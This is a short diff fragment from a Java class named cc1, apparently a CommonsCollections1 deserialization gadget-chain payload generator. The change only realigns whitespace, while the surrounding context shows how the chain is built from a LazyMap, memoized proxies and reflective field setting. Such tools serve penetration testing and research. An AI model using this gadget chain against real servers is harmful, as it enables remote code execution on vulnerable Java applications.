@@ -50,10 +50,10 @@ public class cc1 implements ObjectPayload<InvocationHandler> {
         // real chain for after setup
         final Transformer[] transformers = TransformerUtil.makeTransformer(command);
 
-        final Map               innerMap = new HashMap();
-        final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
-        final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-        final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);// 反射修改iTransformers属性会触发反序列化
 
